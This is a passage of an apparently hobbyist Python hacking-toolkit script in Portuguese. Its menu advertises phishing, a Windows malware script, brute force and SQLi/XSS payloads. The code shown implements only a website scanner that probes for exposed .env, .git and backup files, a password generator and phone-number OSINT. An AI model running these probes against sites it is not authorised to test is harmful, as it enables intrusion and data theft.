import datetime
import ipaddress
import shutil
import json
import socket
import ssl
import urllib.error
import urllib.request
from urllib.parse import urlencode, urlparse
import secrets
import phonenumbers
import http.server
import socketserver
import threading
import textwrap
import base64
import time
import os
import sys
import subprocess
import platform
import hashlib
import random
import string
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    import paramiko  # type: ignore[import-not-found]

def import_paramiko():

    import importlib.util

    if importlib.util.find_spec("paramiko") is None:
        raise ModuleNotFoundError("Biblioteca paramiko não instalada. Instale com: pip install paramiko")

    import paramiko
    return paramiko


RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"

HOST = "127.0.0.1"
PORT = "8080"

IP = "127.168.0.38"
PORTA = "443"

banner = r"""

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⡶⡶⣶⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡷⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⡀⣴⣻⣳⡄⣠⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠉⣳⢿⣷⡏⠉⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⡴⢶⣦⡔⢲⣤⡶⠾⣷⣾⣿⣣⣹⣿⣶⡿⠶⣦⣤⢖⣤⣴⠶⣄⣀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠰⠟⠉⠉⠑⠉⠛⠟⠉⠳⠋⣿⣿⣮⣻⣿⡟⠻⠛⠉⠛⠛⠙⠝⠋⠙⢿⣍⣯⠛⠓⠶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣩⠿⡽⣥⢏⡉⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠼⠃⠀⣹⣇⠀⠣⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡠⠫⢶⣦⣜⣟⣿⣡⣶⠶⠱⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⢿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⠎⠁⠀⠀⠉⢙⣿⣽⣋⠁⠀⠀⠒⠄⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠒⢄⠀⢀⠞⠁⠀⠈⣿⣿⣿⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠎⠀⠀⠈⠀⣠⣾⣿⣿⣿⡍⠑⢮⡁⠘⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣾⣷⣧⣄⡀⠀⠀⢹⣿⣿⣿⣷⡀⠀⠀
⠀⠀⠀⠀⢀⠆⢀⠀⢀⡴⠋⠉⢻⣿⣯⡛⠁⠀⠙⡄⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⢿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠀⡸⠀⡸⠀⡼⠀⠀⠐⣿⡗⣟⣷⠀⠀⢀⠇⠀⢤⣶⣤⡈⢦⡀⠼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠈⣿⣿⣿⣿⣇⠀
⠀⠀⠀⢰⣇⢠⠇⠀⡇⠀⠀⠀⢙⣾⣽⠁⠀⢠⠞⠀⣼⣿⣿⣿⣿⡄⠹⣄⣈⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⣿⣿⣿⣿⣿⠀
⠀⠀⠀⣼⣿⠏⠀⢠⣇⣀⠀⣰⣿⢿⣿⣷⠖⠋⠀⢀⣿⣿⣿⣿⣿⣿⠀⣿⡏⢀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⡇
⠀⠀⠀⢿⣿⠀⠀⠖⣛⣹⠛⠛⠛⠋⠀⠀⠂⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⠘⣇⠀⠁⠠⠤⢅⡀⠉⣉⣛⣋⡉⢀⣿⣿⣿⣿⣿⡁
⠀⠀⠀⢸⡏⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡿⠻⣿⣿⣿⠇⡈⣄⠀⠀⠀⠀⠈⠑⠾⠿⣿⣿⣿⣿⡟⣿⣿⣿⠀
⠀⠀⠀⣿⠃⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠛⠛⠁⠀⡈⠛⡅⠀⡇⢸⣟⠂⠀⠀⠀⠀⠀⠀⠀⠋⠛⢋⣼⣿⣿⣿⠀
⠀⠀⡼⠃⠀⠀⠀⠀⠀⠔⠁⠀⠀⠀⠀⠐⡏⠀⠀⠀⠀⡇⠀⠀⣧⠀⢢⠀⢱⠸⣿⣯⣠⠀⠀⠀⠀⠀⣀⣴⣠⣺⣿⣿⣿⣿⠀
⠀⢠⠃⢀⣀⠤⠐⢉⣩⣉⠁⠀⠀⠀⠀⡜⢀⣄⣀⠦⡘⠛⢂⠜⠛⢧⠞⠳⢘⡀⢹⣿⣷⠀⠀⢀⡀⣊⡁⠈⠙⣿⣿⣿⣿⣿⠀
⠀⣸⠐⢁⣴⢶⣶⣿⣿⣿⣿⣄⠉⢆⠀⣑⡜⠉⣟⣀⣤⣀⣤⠦⠤⢼⣅⣨⢸⢸⣿⣿⣿⣇⣠⣤⣿⣥⣾⣷⣶⣌⠉⠙⢻⡇⠀
⠀⠙⠷⣾⠣⣿⣿⡿⢿⣿⢻⣿⣷⡜⠀⡛⢿⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠑⠙⣶⠙⣿⣿⣏⣿⠟⣿⣿⣿⣿⣿⣧⠀⢸⡇⠀
⠀⠀⠀⠀⢳⣿⣿⡆⠘⣿⢨⣿⣿⡗⢰⠿⠶⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⢉⣹⣿⣿⡿⢰⣿⡇⣼⣿⣿⡿⠀⢴⠅⠀
⠀⠀⠀⠀⠀⢳⡀⠀⠘⣿⠘⣿⣿⣿⠸⡀⣠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠖⢊⡝⡿⠃⢸⣿⠀⣿⣿⣿⣷⡆⡇⠀⠀
⠀⠀⠀⠀⠀⠈⣧⠀⢸⣿⠀⣿⣷⢻⣻⣾⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠚⠋⠁⠀⣿⡇⢠⣿⣿⣿⡿⠀⣇⠀⠀
⠀⠀⠀⠀⠀⠀⣸⠀⢨⣿⡇⣽⣿⠟⣷⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⢸⣿⣿⣿⠇⢀⡎⠀⠀
⠀⠀⠀⠀⠀⡀⢸⠀⠀⣿⡏⣿⡿⠷⠻⣽⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⣾⣿⣿⠟⠀⣿⠀⠀⠀
⠀⠀⠀⠀⠀⢼⣼⡆⢀⡙⢷⣿⣷⡞⣾⣻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡏⠐⣿⡟⠁⠀⣼⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡇⠀⠘⢾⣿⣯⠗⢿⣻⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠃⠀⣿⣷⣾⣿⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⣏⠂⠀⠀⠹⢷⣿⠿⣿⣧⡤⢶⢲⣦⣤⠤⢤⡠⢄⣀⣀⣤⢤⡦⡴⡆⠀⣿⡃⠄⢀⣻⣿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⣖⠀⠀⠀⢀⠉⡀⢈⠀⢻⡉⢹⠁⡷⠀⠸⠀⠘⡀⢻⡄⢸⣇⣿⡅⢀⣿⠋⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣦⣆⠀⠀⠈⠐⠄⠘⠉⠉⢻⠞⠒⣾⠲⡴⠒⠾⠓⢺⠙⠉⡿⣿⣶⣾⡿⠂⠀⠐⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢆⠀⠀⠀⠀⡀⠀⠀⠘⠀⠀⠈⠀⠇⠀⢘⠀⠚⠀⠀⠇⢻⣿⣿⡧⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⡄⠀⠀⠁⠐⠶⠆⠐⠀⠀⠀⠒⣀⣠⣆⣀⠀⢤⣠⣾⡿⠉⠀⠀⣀⣠⡟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⣧⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠙⢿⣿⣿⡿⠿⡿⣯⣶⠆⢠⠌⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣕⠶⣪⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣟⢪⣹⡟⣿⠓⠛⠒⠒⠖⠛⠛⠛⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⢳⢣⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡞⣾⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠅⡟⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                                                                                         
 _____ _____ _____    _____ _____ __  _____ _____ _____    _____ _____ ____  _____ _____ 
|_   _|  |  |   __|  |     |   __|  ||_   _|     |     |  |     | __  |    \|   __| __  |
  | | |     |   __|  |   --|   __|  |__| | |-   -|   --|  |  |  |    -|  |  |   __|    -|
  |_| |__|__|_____|  |_____|_____|_____|_| |_____|_____|  |_____|__|__|____/|_____|__|__|

=============================
  Tool creator: manopaiva26
=============================


"""

print(RED + banner + RESET)

print(GREEN + "🌐Analisador de sites por URL🌐: 1")
print("")
print(YELLOW + "🔠Gerador de senhas🔢: 2")
print("")
print(GREEN + "🗣️Verificação de Telefone📞: 3")
print("")
print(YELLOW + "🌎IPgeolocation🌏: 4")
print("")
print(GREEN + "🐟zphisher🐠: 5")
print("")
print(YELLOW + "​🦠Script completo Malware (apenas para windows)👾: 6")
print("")
print(GREEN + "📡Internet options📡: 7")
print("")
print(YELLOW + "📝Etapas de aprendizagem para cybersegurança📝: 8")
print("")
print(GREEN +"🔑BruteForce🔓: 9")
print("")
print(YELLOW +"🧪Payload Forge (SQLi/XSS/OSI)🧪: 10")
print("")
print(GREEN +"🔬Reverse Engineer (Binário/Script)🔬: 11")
print("")
option = int(input("Qual deseja utilizar: "))

def preparar_url(url):
    url = url.strip()
    if not url:
        raise ValueError("A URL não pode estar vazia.")
    if "://" not in url:
        url = "https://" + url

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("Informe uma URL HTTP ou HTTPS válida.")
    if parsed.username or parsed.password:
        raise ValueError("Não inclua usuário ou senha na URL.")
    try:
        parsed.port
    except ValueError as erro:
        raise ValueError("A porta informada na URL é inválida.") from erro
    return parsed


def requisitar(url, host_autorizado, headers=None, method="GET", limite=65536):
    url_inicial = urlparse(url)
    porta_inicial = url_inicial.port or (443 if url_inicial.scheme == "https" else 80)

    class RedirecionamentoMesmoHost(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, response_headers, new_url):
            novo_url = urlparse(new_url)
            novo_host = novo_url.hostname
            nova_porta = novo_url.port or (443 if novo_url.scheme == "https" else 80)
            mesmo_host = (novo_host or "").lower().rstrip(".") == host_autorizado.lower().rstrip(".")
            mesma_porta = nova_porta == porta_inicial
            upgrade_padrao = (
                url_inicial.scheme == "http"
                and novo_url.scheme == "https"
                and porta_inicial == 80
                and nova_porta == 443
            )
            if not mesmo_host or not (mesma_porta or upgrade_padrao):
                raise urllib.error.HTTPError(
                    new_url, code, "Redirecionamento para fora do host/porta bloqueado",
                    response_headers, fp
                )
            if req.full_url.startswith("https://") and new_url.startswith("http://"):
                raise urllib.error.HTTPError(
                    new_url, code, "Redirecionamento HTTPS para HTTP bloqueado",
                    response_headers, fp
                )
            return super().redirect_request(
                req, fp, code, msg, response_headers, new_url
            )

    request = urllib.request.Request(
        url,
        headers=headers or {"User-Agent": "AnalisadorEducacional/1.0"},
        method=method,
    )
    opener = urllib.request.build_opener(RedirecionamentoMesmoHost)
    try:
        response = opener.open(request, timeout=8)
    except urllib.error.HTTPError as erro:
        response = erro

    with response:
        corpo = response.read(limite)
        return response.status, response.headers, corpo, response.url


def analisar_dns(host):
    print("\n[DNS]")
    try:
        enderecos = sorted({
            resultado[4][0]
            for resultado in socket.getaddrinfo(host, None)
        })
        print("Endereços encontrados:", ", ".join(enderecos))
        if enderecos:
            ip_principal = next(
                (
                    endereco
                    for endereco in enderecos
                    if ipaddress.ip_address(endereco).version == 4
                ),
                enderecos[0],
            )
            print("IP principal:", ip_principal)
    except socket.gaierror as erro:
        print(f"Falha ao consultar DNS: {erro}")


def analisar_subdominios(host):
    print("\n[Subdomínios]")
    try:
        dominio = host.rstrip(".").encode("idna").decode("ascii").lower()
    except UnicodeError as erro:
        print(f"[INFO] Não foi possível preparar o domínio para consulta: {erro}")
        return

    try:
        ipaddress.ip_address(dominio)
    except ValueError:
        if dominio.startswith("www."):
            dominio = dominio[4:]
    else:
        print("[INFO] A consulta de subdomínios exige um nome de domínio, não um IP.")
        return

    consulta = urlencode({"q": f"%.{dominio}", "output": "json"})
    request = urllib.request.Request(
        f"https://crt.sh/?{consulta}",
        headers={"User-Agent": "AnalisadorEducacional/1.0"},
    )
    try:
        with urllib.request.urlopen(request, timeout=8) as response:
            dados = response.read(1_048_577)
        if len(dados) > 1_048_576:
            print("[INFO] A resposta do crt.sh excedeu o limite de 1 MiB.")
            return
        registros = json.loads(dados.decode("utf-8"))
    except (
        OSError,
        urllib.error.URLError,
        TimeoutError,
        UnicodeError,
        json.JSONDecodeError,
    ) as erro:
        print(f"[INFO] Não foi possível consultar subdomínios no crt.sh: {erro}")
        return

    if not isinstance(registros, list):
        print("[INFO] O crt.sh retornou uma resposta em formato inesperado.")
        return

    subdominios = set()
    sufixo = f".{dominio}"
    for registro in registros:
        if not isinstance(registro, dict):
            continue
        nomes = registro.get("name_value")
        if not isinstance(nomes, str):
            continue
        for nome in nomes.splitlines():
            nome = nome.strip().lower()
            if nome.startswith("*."):
                nome = nome[2:]
            if nome.endswith(sufixo) and nome != dominio:
                subdominios.add(nome)

    if not subdominios:
        print("Nenhum subdomínio encontrado nos registros consultados.")
        return

    print("Subdomínios encontrados em certificados públicos:")
    for subdominio in sorted(subdominios):
        print(f"- {subdominio}")
    print("[INFO] Esses nomes podem ser históricos e não estar ativos atualmente.")


def analisar_tls(host, porta):
    print("\n[Certificado TLS]")
    try:
        contexto = ssl.create_default_context()
        with socket.create_connection((host, porta), timeout=8) as conexao:
            with contexto.wrap_socket(conexao, server_hostname=host) as tls:
                certificado = tls.getpeercert()
                versao_tls = tls.version()
        expiracao = datetime.datetime.fromtimestamp(
            ssl.cert_time_to_seconds(certificado["notAfter"]),
            tz=datetime.timezone.utc,
        )
        emissor = ", ".join(
            f"{chave}={valor}"
            for grupo in certificado.get("issuer", ())
            for chave, valor in grupo
        )
        print(f"TLS negociado: {versao_tls}")
        print(f"Certificado válido até: {expiracao:%Y-%m-%d %H:%M UTC}")
        print("Emissor:", emissor or "não informado")
    except (OSError, ssl.SSLError, KeyError, ValueError) as erro:
        print(f"Não foi possível validar TLS: {erro}")


def analisar_headers(headers, usa_https):
    print("\n[Headers e cookies]")
    verificacoes = {
        "Content-Security-Policy": "Política de segurança de conteúdo (CSP)",
        "X-Content-Type-Options": "Proteção contra MIME sniffing",
        "Referrer-Policy": "Política de Referer",
        "Permissions-Policy": "Política de permissões do navegador",
    }
    for nome, descricao in verificacoes.items():
        valor = headers.get(nome)
        print(f"{'[OK]' if valor else '[ATENÇÃO]'} {descricao}: {valor or 'ausente'}")

    frame_options = headers.get("X-Frame-Options")
    csp = headers.get("Content-Security-Policy", "")
    protege_frames = frame_options or "frame-ancestors" in csp.lower()
    print(
        f"{'[OK]' if protege_frames else '[ATENÇÃO]'} "
        f"Proteção contra framing: {frame_options or ('definida na CSP' if protege_frames else 'ausente')}"
    )

    hsts = headers.get("Strict-Transport-Security")
    if usa_https:
        print(f"{'[OK]' if hsts else '[ATENÇÃO]'} HSTS: {hsts or 'ausente'}")
    elif hsts:
        print(f"[INFO] HSTS recebido por HTTP: {hsts}")

    for cookie in headers.get_all("Set-Cookie", []):
        nome = cookie.split("=", 1)[0]
        atributos = cookie.lower()
        ausentes = [
            flag for flag, presente in (
                ("Secure", " secure" in atributos),
                ("HttpOnly", " httponly" in atributos),
                ("SameSite", " samesite=" in atributos),
            )
            if not presente
        ]
        print(
            f"{'[ATENÇÃO]' if ausentes else '[OK]'} Cookie {nome}: "
            f"atributos ausentes: {', '.join(ausentes) if ausentes else 'nenhum'}"
        )
    if not headers.get_all("Set-Cookie", []):
        print("Nenhum cookie enviado na resposta inicial.")

    for nome in ("Server", "X-Powered-By", "X-Generator"):
        if headers.get(nome):
            print(f"[INFO] {nome}: {headers[nome]}")


def analisar_cors(headers):
    origem = headers.get("Access-Control-Allow-Origin")
    credenciais = headers.get("Access-Control-Allow-Credentials", "").lower()
    if origem == "*" and credenciais == "true":
        print("[ATENÇÃO] CORS combina origem curinga com credenciais; navegadores bloqueiam essa combinação.")
    elif origem == "https://scanner.invalid" and credenciais == "true":
        print("[ALERTA] CORS parece refletir uma origem arbitrária com credenciais.")
    elif origem:
        print(f"[INFO] CORS respondeu Access-Control-Allow-Origin: {origem}")
    else:
        print("[OK] A resposta não liberou CORS para a origem de teste.")


def verificar_exposicoes(base_url, host):
    print("\n[Arquivos e páginas potencialmente expostos]")
    caminhos = (
        ("/.env", (b"=", b"")),
        ("/.git/config", (b"[core]",)),
        ("/backup.zip", (b"PK\x03\x04",)),
        ("/server-status", (b"Apache Server Status", b"Server uptime")),
    )
    for caminho, assinaturas in caminhos:
        try:
            status, _, corpo, _ = requisitar(
                base_url.rstrip("/") + caminho,
                host,
                limite=65536,
            )
            conteudo = corpo.lower()
            exposto = status == 200 and any(
                assinatura.lower() in conteudo
                for assinatura in assinaturas
                if assinatura
            )
            if caminho == "/.env" and status == 200:
                exposto = b"=" in corpo and any(
                    marcador in conteudo
                    for marcador in (b"secret", b"password", b"api_key", b"database")
                )
            print(
                f"{'[ALERTA] Possível arquivo/página exposta' if exposto else '[OK]'} "
                f"{caminho} (HTTP {status})"
            )
        except (OSError, urllib.error.URLError, TimeoutError, ValueError) as erro:
            print(f"[INFO] Não foi possível verificar {caminho}: {erro}")


def verificar_metodos(base_url, host):
    print("\n[Métodos HTTP]")
    try:
        status, headers, _, _ = requisitar(
            base_url,
            host,
            method="OPTIONS",
            limite=0,
        )
        permitidos = headers.get("Allow", "")
        print(f"OPTIONS retornou HTTP {status}; Allow: {permitidos or 'não informado'}")
        if "TRACE" in {metodo.strip().upper() for metodo in permitidos.split(",")}:
            print("[ATENÇÃO] TRACE aparece como método permitido.")
    except (OSError, urllib.error.URLError, TimeoutError, ValueError) as erro:
        print(f"[INFO] Não foi possível consultar OPTIONS: {erro}")


def analise():
    print("[!] Execute somente em sites seus ou para os quais tenha autorização.")
    url = input("Digite a URL que deseja analisar: ")

    try:
        parsed = preparar_url(url)
    except ValueError as erro:
        print(f"[!] URL inválida: {erro}")
        return

    host = parsed.hostname
    porta = parsed.port or (443 if parsed.scheme == "https" else 80)
    print(f"\n[!] Iniciando verificações de baixo impacto em {parsed.geturl()}")
    analisar_dns(host)
    analisar_subdominios(host)

    if parsed.scheme == "https":
        analisar_tls(host, porta)
    else:
        print("\n[Certificado TLS]\n[ATENÇÃO] O endereço informado usa HTTP sem criptografia.")

    try:
        status, headers, corpo, url_final = requisitar(
            parsed.geturl(),
            host,
            headers={
                "User-Agent": "AnalisadorEducacional/1.0",
                "Origin": "https://scanner.invalid",
            },
        )
        print("\n[Resposta HTTP]")
        print(f"Status: {status}")
        print(f"URL final: {url_final}")
        print(f"Tamanho lido: {len(corpo)} bytes (máximo de 64 KiB)")
        analisar_headers(headers, parsed.scheme == "https")
        analisar_cors(headers)

        if b"index of /" in corpo.lower():
            print("[ALERTA] A página parece apresentar listagem de diretório.")
    except (OSError, urllib.error.URLError, TimeoutError, ValueError) as erro:
        print(f"\n[!] Não foi possível consultar a página: {erro}")
        return

    base_url = f"{parsed.scheme}://{parsed.netloc}/"
    verificar_metodos(base_url, host)
    verificar_exposicoes(base_url, host)
    print(
        "\n[!] Resultado preliminar: os alertas são indícios, não confirmação "
        "de vulnerabilidade. Faça uma revisão manual antes de tirar conclusões."
    )

def gerador_de_senhas():
    caracteres = input(
        "Digite os caracteres permitidos (ex.: abcABC123!@#): "
    )
    if not caracteres:
        print("[!] Informe pelo menos um caractere permitido.")
        return

    try:
        tamanho = int(input("Quantos caracteres deve ter a senha? "))
    except ValueError:
        print("[!] O tamanho precisa ser um número inteiro.")
        return

    if not 1 <= tamanho <= 256:
        print("[!] Escolha um tamanho entre 1 e 256.")
        return

    senha = "".join(secrets.choice(caracteres) for _ in range(tamanho))
    print(f"\nSua senha gerada: {senha}")




import phonenumbers
from phonenumbers import geocoder, carrier, timezone


# DDDs brasileiros e seus estados/regiões de numeração.
DDD_BR = {
    **dict.fromkeys([
        "11"
    ], "São Paulo (SP)"),
    **dict.fromkeys([
        "12", "13", "14", "15", "16", "17", "18", "19"
    ], "São Paulo (SP)"),
    **dict.fromkeys([
        "21", "22", "24"
    ], "Rio de Janeiro (RJ)"),
    "27": "Espírito Santo (ES)",
    "28": "Espírito Santo (ES)",
    **dict.fromkeys([
        "31", "32", "33", "34", "35", "37", "38"
    ], "Minas Gerais (MG)"),
    "36": "DDD não atribuído na tabela",
    **dict.fromkeys([
        "41", "42", "43", "44", "45", "46"
    ], "Paraná (PR)"),
    "47": "Santa Catarina (SC)",
    "48": "Santa Catarina (SC)",
    "49": "Santa Catarina (SC)",
    **dict.fromkeys([
        "51", "53", "54", "55"
    ], "Rio Grande do Sul (RS)"),
    **dict.fromkeys([
        "61"
    ], "Distrito Federal e entorno"),
    **dict.fromkeys([
        "62", "64"
    ], "Goiás (GO)"),
    "63": "Tocantins (TO)",
    **dict.fromkeys([
        "65", "66"
    ], "Mato Grosso (MT)"),
    "67": "Mato Grosso do Sul (MS)",
    "68": "Acre (AC)",
    "69": "Rondônia (RO)",
    **dict.fromkeys([
        "71", "73", "74", "75", "77"
    ], "Bahia (BA)"),
    "79": "Sergipe (SE)",
    **dict.fromkeys([
        "81", "87"
    ], "Pernambuco (PE)"),
    "82": "Alagoas (AL)",
    "83": "Paraíba (PB)",
    "84": "Rio Grande do Norte (RN)",
    **dict.fromkeys([
        "85", "88"
    ], "Ceará (CE)"),
    "86": "Piauí (PI)",
    "89": "Piauí (PI)",
    **dict.fromkeys([
        "91", "93", "94"
    ], "Pará (PA)"),
    "92": "Amazonas (AM)",
    "95": "Roraima (RR)",
    "96": "Amapá (AP)",
    **dict.fromkeys([
        "97"
    ], "Amazonas (AM)"),
    "98": "Maranhão (MA)",
    "99": "Maranhão (MA)",
}


def telefone():
    print("\n=== ANÁLISE DE TELEFONE OSINT ===")

    entrada = input(
        "Telefone internacional (ex.: +55 32 99821-3909): "
    ).strip()

    if not entrada:
        print("[!] Informe um número.")
        return

    try:
        numero = phonenumbers.parse(
            entrada,
            None if entrada.startswith("+") else "BR"
        )
    except phonenumbers.NumberParseException as erro:
        print(f"[!] Erro ao interpretar o número: {erro}")
        return

    # Verificações básicas
    possivel = phonenumbers.is_possible_number(numero)
    valido = phonenumbers.is_valid_number(numero)

    codigo = numero.country_code
    regiao_codigo = phonenumbers.region_code_for_number(numero)

    # Mapeamento de Códigos ISO para Nomes de Países (Português)
    nomes_paises = {
        "BR": "Brasil",
        "PT": "Portugal",
        "US": "Estados Unidos",
        "CA": "Canadá",
        "GB": "Reino Unido",
        "ES": "Espanha",
        "FR": "França",
        "DE": "Alemanha",
        "IT": "Itália",
        "JP": "Japão",
        "IN": "Índia",
        "AU": "Austrália",
        "MX": "México",
        "AR": "Argentina",
        "CL": "Chile",
        "CO": "Colômbia",
        "AO": "Angola",
        "MZ": "Moçambique",
    }

    pais = nomes_paises.get(regiao_codigo, "Consultar metadados internacionais")

    # Geolocalização e Tipo
    descricao = geocoder.description_for_number(numero, "pt")
    tipo_numero = phonenumbers.number_type(numero)

    # Mapeamento de Tipos de Número para Português
    nomes_tipos = {
        phonenumbers.PhoneNumberType.FIXED_LINE: "Telefone fixo",
        phonenumbers.PhoneNumberType.MOBILE: "Celular",
        phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Fixo ou celular",
        phonenumbers.PhoneNumberType.TOLL_FREE: "Ligação gratuita",
        phonenumbers.PhoneNumberType.PREMIUM_RATE: "Tarifa premium",
        phonenumbers.PhoneNumberType.SHARED_COST: "Custo compartilhado",
        phonenumbers.PhoneNumberType.VOIP: "VoIP",
        phonenumbers.PhoneNumberType.PERSONAL_NUMBER: "Número pessoal",
        phonenumbers.PhoneNumberType.PAGER: "Pager",
        phonenumbers.PhoneNumberType.UAN: "UAN",
        phonenumbers.PhoneNumberType.VOICEMAIL: "Correio de voz",
        phonenumbers.PhoneNumberType.UNKNOWN: "Desconhecido",
    }

    tipo = nomes_tipos.get(tipo_numero, "Desconhecido")

    estado = "Não identificado"
    codigo_area = "Não disponível"

    # Lógica específica para Brasil (DDDs)
    if regiao_codigo == "BR":
        nacional = str(numero.national_number)
        if len(nacional) >= 10:
            ddd = nacional[:2]
            codigo_area = ddd
            # Busca no dicionário de DDDs definido no escopo global ou local
            # (Assumindo que DDD_BR está definido antes desta função ou é global)
            if 'DDD_BR' in globals():
                estado = DDD_BR.get(ddd, "Estado não mapeado")
            else:
                estado = f"DDD {ddd}"

    # Para números estrangeiros, usa a descrição geográfica da biblioteca
    elif descricao:
        estado = descricao

    operadora = carrier.name_for_number(numero, "pt")
    fusos = timezone.time_zones_for_number(numero)

    print("\n========== RESULTADO ==========")
    print(f"Número possível: {'Sim' if possivel else 'Não'}")
    print(f"Número válido: {'Sim' if valido else 'Não'}")
    print(f"País: {pais}")
    print(f"Código internacional: +{codigo}")
    print(f"Tipo: {tipo}")
    print(f"Estado/região associada: {estado}")
    print(f"Código de área/DDD: {codigo_area}")
    print(f"Descrição geográfica: {descricao or 'Não disponível'}")
    print(f"Operadora indicada: {operadora or 'Não identificada'}")
    print(
        "Fusos associados: "
        + (", ".join(fusos) if fusos else "Não disponíveis")
    )

    if valido:
        print(
            "Formato internacional: "
            + phonenumbers.format_number(
                numero,
